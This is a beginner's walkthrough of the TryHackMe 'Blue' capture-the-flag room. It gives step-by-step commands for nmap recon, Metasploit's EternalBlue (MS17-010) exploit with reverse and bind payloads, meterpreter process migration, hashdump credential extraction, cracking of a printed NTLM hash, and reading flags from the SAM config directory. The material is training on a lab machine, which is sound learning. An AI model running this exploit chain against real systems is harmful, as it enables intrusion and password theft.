# Frank Costantino - TryHackMe | Blue Writeup in Layman's Terms

## Some Quick Notes:

I originally wrote this tutorial for my cousin, but I figured this would benefit a larger audience who, like my cousin and myself, had no idea how to get started on this nor what this was about.

This tutorial heavily references [m0rn1ngstr’s TryHackMe - Blue writeup](https://m0rn1ngstr.github.io/tryhackme/THM-Blue/) for the first couple sections.

This tutorial assumes you have Kali Linux installed on VirtualBox on a Windows Machine. If you do not, I highly recommend following [this guide](https://www.youtube.com/watch?v=V_Payl5FlgQ) exactly for installation.

## What you will learn by the end of this tutorial:

1. How to set up a virtual machine using `Virtual Box`. In particular, you will learn how to install a `Kali Linux` machine.

2. How to complete [TryHackMe’s Blue room](https://tryhackme.com/room/blue#). We will discover the answers to each of the tasks’ questions as we tackle Blue together.

3. The basic use of the `nmap` command.

4. The basic use of `Metasploit`.

5. The purpose and use of auxiliary modules in relation to `Metasploit` and vulnerability detection.

6. How to `scan for, detect, and analyze machine vulnerabilites` to later exploit them (the fun part)!

7. What `Remote Code Execution` is and how we can use it to do some fun things with Blue (i.e. the major exploit of this machine).

8. What `meterpreter` is and how to make use of it. Additionally, I will cover some basic meterpreter and bash commands and their usage such as `search`, `dir` or `ls`, and `cd`.

## Instructions For Getting Started:
1. Head to the [Blue room](https://tryhackme.com/room/blue#) on TryHackMe.

2. Create an account so you can fully utilize the Blue room.

3. Start the Blue machine, which will allow you to begin Task 1: Recon.

4. This will also allow you to grab the IP Address of Blue so you can complete this room in your Virtual Machine (VM).

5. Connect using the OpenVPN on your local Windows machine (this is integral to allowing you complete the Blue Room on your Kali-Linux VM).

6. You can access this tutorial by clicking on the IP address at the top of the webpage contained in a rounded green button.

7. An "Active Machine Information" tab will pop up at the top of the screen on the TryHackMe site, and you have a title, a timer, and most importantly, an IP Address (which you will need for `nmap` to begin the analysis of Blue).

        NOTE: If you notice your machine is about to expire, you can extend its life for an additional hour at any time. Once the machine expires, you need to restart it and complete any previous tutorial steps to get back to where you were.

    *We can now officially start answering the questions for Task 1: Recon!*

## *Task 1: Recon*

The purpose of this phase is scan and learn what exploit Blue is vulnerable to. Let's get started!

1. Go to the terminal in your Kali Linux machine and type `sudo nmap -T4 -A [IP Address given from the Blue Machine on tryhackme]`. An explanation of what those commands flags do is in m0rn1ngstr’s tutorial.

        NOTE: I have omitted the option `-p-`, which scans ports 1 through 65535. If you do not omit this option, `nmap` may take upwards of 20 minutes to run. In my personal experience, it’s not necessary to complete the tutorial.

2. We can now officially start answering questions for *Recon*!
    
    * *How many ports are open with a port number under 1000?*
        
        - Near the top of the nmap output, we see columns representing the open ports (what ports are available), the service (application name and version) those ports are offering and what OS versions they are running.![This image is nmap output!](Task_1_Image_1.jpg)

            \> We are simply looking for ports with a port number less than 1000. **As we can see above in the screenshot of the `nmap` output, there are 3.**

    * *What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)*

        - If we pay particular attention to the 3rd port under 1000 that is open, we see:

            1. **445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)**

                - While this may not seem like anything particularly important, this single line gives us a ton of information pertaining to the exploit Blue is hiding.

            2. After copying and pasting this line into Google, we can see on the website Exploit Database that Blue’s vulnerability is `Remote Code Execution (RCE)`.![Windows vulnerability MS17-010](Task_1_Image_2.jpg)

            3. As the name of this exploit exactly suggests, an attacker has the ability to execute arbitrary commands or code on a remote machine. RCE actually belongs to a broader class of `arbitrary code execution (ACE)` vulnerabilities.

            4. As you can imagine, this is a very serious vulnerability and the damage a widespread attack of this nature could cause cannot be understated, so let’s try it out!

        - **As we see in the screenshot, the official name of the vulnerability patch is MS17-010.**

*We are officially done with Recon! Let’s see how we can gain remote access to this machine in Task 2!*

## *Task 2: Gain Access*

The goal of this stage is to exploit the vulnerability we found in the previous Recon stage to gain access to this machine. The questions pertaining to this task are below.

1. *Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)*

    * To do this, we need to first run `Metasploit`. For the sake of keeping this tutorial brief, I personally think TryHackMe explains `Metasploit` very well. It is described as an open-source penetration-testing framework.
        
        > Consider `Metasploit` to be part of your arsenal as a wee-baby security engineer. Now that we have the hammer, we need to learn how to use it!

    * Fire up `Metasploit` by typing `msfconsole` into Kali Linux.

            NOTE: If you see any errors, mainly that of “Kernel Panic”, go to the settings of your Kali linux Machine in Virtual Box, then navigate to System -> Processor and enable both Extended Features (Enable PAE/NX & Enable Nested VT-x/AMD-v) to resolve this.

        *Before you move on, shout out Rapid7 for making this incredible tool for us to use.*

        Now, you should see something like this in your terminal!![metasploit startup](Task_2_Image_1.jpg)

    * In the shell prompt, type `search ms17-010` to search for the RCE exploit we found earlier. You should see 6 matching modules appear. While there are many directories beginning with “exploit…” as the question suggests, we are looking for module 3 in particular.
    
        - This also happens to be the answer to our question: **exploit/windows/smb/ms17_010_eternalblue_win8**

2. *Show options and set the one required value. What is the name of this value? (All caps for submission).*

    * As *m0rn1ngstr* recommends, we should first check if the host is vulnerable before trying an exploit. To do this, we will use an auxiliary module (module #1 to be exact).

        > From m0rn1ngstr: “Auxiliary - An auxiliary module does not execute a payload. It can be used to perform arbitrary actions that may not be directly related to exploitation. Examples of auxiliary modules include scanners, fuzzers, and denial of service attacks.”
    
    * In the Metasploit shell, type `use 1`. 
        
        - Alternatively, type: `use auxiliary/scanner/smb smb_ms17_010`

    * Then, type `options` to see the state of `RHOSTS`, which dictates the target of the scan. It will initially be blank. *This option is required and must be set before we can continue*.

        - We want to set `RHOSTS` as the IP address of our target machine, which is the IP Address from the *Active Machine Information* on TryHackMe.

            - Type `set RHOSTS [ACTIVE_INFO_IP_ADDRESS]`

            - You should see shell output indicating the new value of `RHOSTS`. If you want to confirm the change, type `options` again.

    * For the purposes of this question, the answer is **RHOSTS**, the option we needed to set to our target IP.

3. *There are no more questions to explcitly answer in this section. I will start with some notes regarding instructions seen on TryHackMe. At the end of this section, make sure to mark the last two steps as done.*

        NOTE: TryHackMe suggests the usage of the command `set payload windows/x64/shell/reverse_tcp`
    
        In general, payloads help us establish exploits In particular, this payload creates a remote-desktop in the target machine using a call-back from Windows to Metasploit.
    
        Specifying the payload is VERY important, and it could be why your exploit may be repeatedly failing. I will discuss this further soon.

    * Your next move is to type `run` to begin the scanner.

        - Now we have proof that Blue is vulnerable to MS17-10: Remote Code Execution!![Proof!](Task_2_Image_2.jpg)

    * Now, let’s figure out how to run our exploit now (remember that these are the modules whose names start with `exploit`).

        > As *m0rn1ngstr* explains, an exploit is: “an exploit module executes a sequence of commands to target a specific vulnerability found in a system or application. An exploit module takes advantage of a vulnerability to provide access to the target system. Exploit modules include buffer overflow, code injection, and web application exploits.”

        - Type `use 2` or `use exploit/windows/smb/ms17_010_eternalblue` into your Metasploit shell.

        - Then, type `show options` (or just `options`) to pull up the settings for the exploit. Here, we will need to set `RHOSTS` to our target IP like we did before.

            - To do this, type: `set RHOSTS [TARGET_IP]`

        - In an effort to avoid running into issues with running the exploit, we will also set the eternalblue module’s `LHOST` option.
        
            > LHOST refers to the IP of your machine, which will be used to create a reverse connection to your machine after the exploit runs successfully.

        - To set our `LHOST` option, it’s the same setup as setting the `RHOST` option, but instead of using the target IP (the IP of the web-based VM we are running from the TryHackMe site), we will be using the private IP seen in the OpenVPN Connect profile screen.

            - You can see this after scrolling down in the OpenVPN window that shows your active connection, as squared in black in the following image.![OpenVpn](Task_2_Image_3.jpg)

                - So, the final command to type into the Metasploit shell is set `LHOST [Your_Private_IP]`.

    * FINALLY, to complete this task and run the exploit, type `run` or `exploit`.

        - If this is successful, you should appear in the windows shell now! CONGRATULATIONS!

        > If the exploit fails, you should first attempt to troubleshoot by running the exploit again. If that doesn't work, you should restart your Blue machine on the TryHackMe site. Don't worry, I had this issue plenty of times. If you find there are repeated failures despite following all the above directions correctly (like myself for 3 days legitimately), follow the steps below.
        
        * We are going to try and change the `payload` again. First, in the Metasploit shell, type `show payloads`.

            * You should see a list of 56 payloads. However, the one we want to try is #15, named `windows/x64/meterpreter/bind_tcp`.
            
            * Now, configure the payload to the meterpreter tcp bind: `set payload windows/x64/meterpreter/bind_tcp`

            * Now, run the exploit again as shown above. Hopefully, by this time you will finally see that beautiful `WIN` sign and see a meterpreter shell prompt!

                    For those who are curious, `meterpreter` is an alternative interactive shell that provides us with more powerful tools to explore and execute code on our target machine. You can think of it as the standard windows command line, but with more features.
                    
                    The `bind_tcp` part of the payload specifies that we want to connect to a listener port on the target machine and open up a new service (e.g. a shell).
        
        * If at this point you cannot successfully run the exploit, continue to Google fixes. Using Google efficiently is an incredibly value skill for any engineer, so consider this practice :)!

*At this point, we are ready to move on to Task 3: Escalate!*

## Task 3: Escalate

This task involves mainly upgrading our standard `windows shell` to `meterpreter shell`.

*Again this section does not have many explicit questions that need to be answered, so remember to mark tutorial steps as done on TryHackMe.*

    PLEASE READ THIS ALL:
    
    From this point forward, I will not be referencing m0rn1ngstr’s tutorial much at all. If you find it to be helpful, continue to follow along using that guide as well.

    If you had to change the payload to the meterpreter shell I just mentioned in the above section in a troubleshooting effort, then congratulations! Your previous issues have netted you an advantage, since you no longer need to go through the process of upgrading your shell!

    However, if you were one of the lucky people who had no issues with the payload the TryHackMe tutorial specifies, then please follow this tutorial from John Hammond at the time-stamp I provided until the 17:30 mark: https://youtu.be/s6rwS7UuMt8?t=777

    John Hammond does a fantastic job at explaining the first 5 questions of Task 3. The branching payload paths will reconvene in the tutorial at question 6 of the TryHackMe tutorial, which starts with “Verify that we have escalated to…”.

    I hate to point you to other places to find necessary information, since I planned to have this tutorial as to be all encompassing for beginners, but this tutorial is already long, and watching Mr. Hammond is a better use of your time, since I could not explain that part as nearly as eloquently.

1. **RECONVENE HERE**: As the branching paths converge, we pick back up at question 6 of the TryHackMe tutorial, which starts with *“Verify that we have escalated to…”*.

    * For those who started in the meterpreter shell you have two options to confirm you are *NT AUTHORITY\SYSTEM*.

        > NT Authority\System is one of the most powerful accounts on a Windows local instance, even more powerful than an Admin account. Since I don’t know any better, I’d equate it to a Super Admin level of privileges on a Windows machine.


        * Option #1: Type `getuid` in the meterpreter shell.
        
        * Option #2: Type `shell` to be put into the Windows commands line. Then type `whoami` to confirm that you have *LocalSystem* privileges, which shows as `nt authority\system`.

            * *For those who took option #2*: To get back into meterpreter, hit `Control-Z`, type `y`, then `press enter` to background the windows shell.

    *OKAY, now I will continue following along with the TryHackMe tutorial. If at any point, my explanation becomes unclear, please refer back to John Hammond’s video, he again explains the process in great detail.*

2. The next step in the tutorial states: *List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column)*.

    * So, type `ps` to list out all the running processes. 
    
        * We are looking for a process that is running at **NT AUTHORITY\SYSTEM**. Although TryHackMe recommends a process near the bottom of the list (such as `cmd.exe`), I’m going to use `winlogon.exe` since it is a more stable and active process. winlogon.exe has a process ID (PID) of 644. The picture below marks `cmd.exe` with a red line in case you want to use that.![Here is a picture of what I’m looking at.](Task_3_Image_1.jpg)

3. The next step now says we need to use the `migrate` command to do exactly as the name suggests, move our winlogon.exe process elsewhere! This essentially means moving our meterpreter instance in memory to another process space, prolonging its session lifetime amongst other things.

    * In my case, I would type `migrate 644`, but remember to place the PID of YOUR process. So the general command structure is `migrate [PID]`.

*Once you have migrated successfully, we can finally move onto Task 4: Cracking!*

## Task 4: Cracking

*This task is all about what you might think of when you hear the word “hacking”. Since we already hacked into Blue, we are now snooping through this machine to find passwords! We will answer the questions presented on TryHackMe.*

1. The first step of this task states: *Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?*

    * So, type `hashdump` into the meterpreter shell and you will see a long string each pertaining to the Administrator, Guest, and Jon (our unknowing victim).

        * Since Guest is the default user, and we do not have access to the Administrator account as a new Windows user, our **non-default user would be Jon**!

2. The next question: *Copy this password hash to a file and research how to crack it. What is the cracked password?*

    * We see that Jon has a hash associated with his account (his password)! This hash is a form of basic encryption that just scrambles plain text into a unique string. We need to crack this hash to gain access to Jon’s account.

        * This hash is: `aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d

    * Since I have no idea how to do this myself, we will use [crackstation](https://crackstation.net/) to do all the heavy lifting for us!

        * If you try to enter the entire hash I have pasted above, you will find that there is no result. The trick here is that you need to paste only the second half of the hash (everything after the first colon) to find something!

            > I don't know why this works, but just know it works :)!

    * Jon’s cracked password is **alqfna22**, so I guess he might be a shill for Aquafina. Clever advertising technique TryHackMe!

*Guess what?! You now have full access to Jon’s account on his machine! With this information, we will move onto Task 5: Find Flags!*

## Task 5: Find Flags

*The purpose of this task is to take you on a tour of key locations within a Windows system. Each flag represents a place where you can find extremely valuable information!*

    Try to solve these on your own before looking at the answers!

1. *Flag 1: This flag can be found at the system root.*
    
    * The hint for this flag is “Can you C it?” which might point us in the direction of a certain directory.

        * The hint refers to the C drive! To navigate here from the meterpreter shell, type `cd C:/` and then type `dir` or `ls` to list out the contents of the directory.

        * Looking in the directory, we can see a flag1.txt! Use the command `cat` (which stands for “concatenate”) to display out the contents of this text file by typing `cat flag1.txt`

            * You will see that the flag literally is **flag{access_the_machine}**, the answer to this question!

2. *Flag 2: This flag can be found at the location where passwords are stored within Windows.*

    * The hint for this flag is “I wish I wrote down where I kept my password. Luckily it's still stored here on Windows.”

        > Errata on the TryHackMe site states that Windows does not like the location of this flag and occasionally will delete it. If this happens, you need to restart the machine and rerun the exploit (so hopefully this doesn’t happen to you)!

    * After some quick Googling, I found that Windows stores hashes for passwords in the c:\Windows\System32\Config\ directory. So let’s navigate here with the following command:

        * `cd C:/Windows/System32/config`

        * Now, list the contents of the directory with `dir` or `ls` and search for our flag text file. You should find it to be named `flag2.txt`.

            * Show the contents of this file by typing `cat flag2.txt`

    * You will see this flag is **flag{sam_database_elevated_access}**, the answer!

3. *Flag 3: This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.*

    * The hint for this flag is “You'll need to have elevated privileges to access this flag.”

    * There really isn’t much to go off of given this hint, especially for a novice like myself. However, I do know from my personal experience that User directories, such as *Documents* and *AppData* require admin privileges. Similarly, there are many other directories that have the same admin requirements.

        * I could begin my search at *Documents* but there is no guarantee I will find the flag there.

    * To circumvent guessing the location of the flag, meterpreter has a neat command called `search` that allows us to search all directories for certain files. Using this, we can find the third flag easily.

        * Typing `search -f flag3.txt` and we will find that the flag is hidden in `C:\Users\Jon\Documents\`

        * We can `cat` this file from our current working directory to avoid navigating to the above directory mentioned by typing `cat C:\\Users\\Jon\\Documents\\flag3.txt`
    
    * The flag contains the following answer: **flag{admin_documents_can_be_valuable}**

            Notice how I used double backslashes “\\” to cat flag3 in its directory. This is something called an “escape sequence”, where two backslashes are used to represent a single literal “\” backslash. This is because a single backslash is a special character in many operating systems.

        > **Useful side note here!** We could have used our newly-found meterpreter `search` command and some extra knowledge to find all flags from the get-go by typing the following: `search -f flag*.txt`. The asterisk at the end of “flag” is a special character known as the "wildcard" and extends from formal logic topics known as regular expressions. The asterisk/wildcard in this context means we want to search for a string that begins with the word “flag” followed by literally any other character or sequence of characters (or string).

# Final Remarks

* And with that, we are done with the tutorial! Thank you very much for reading and I hope you learned as much as I did writing this. This was meant to be a nearly exhaustive tutorial for those entirely new to hacking.

* Special thanks to `TryHackMe` for the `Blue Room`, `m0rn1ngstr` for his amazing write-up, and `John Hammond` as well as `HackerSploit` for their extremely helpful video tutorials that aided me in writing this tutorial and completing this TryHackMe room.

* Here is a quick list of references and resources I made use of while writing this tutorial:

    1. [LHOST vs. RHOST explanation.](https://medium.com/swlh/intro-to-metasploit-19e3d07ff725#:~:text=In%20Metasploit%2C%20LHOST%2C%20RHOST%20and,address%20of%20the%20target%20host)

    2. [Article about the basics of meterpreter.](https://doubleoctopus.com/security-wiki/threats-and-tools/meterpreter/)

    3. [John Hammond's Blue Room tutorial.](https://youtu.be/s6rwS7UuMt8)

    4. [HackerSploit's Blue Room tutorial.](https://youtu.be/32W6Y8fVFzg)

    5. [How to install Kali Linux on Virtual Box.](https://www.youtube.com/watch?v=V_Payl5FlgQ)

### I, Frank Costantino, am the sole author of this tutorial. Please feel free to contact me for questions regarding the distribution of this tutorial by anyone other than myself. I do not take credit for any other resources, videos, or articles I mentioned in this tutorial.






































































































    













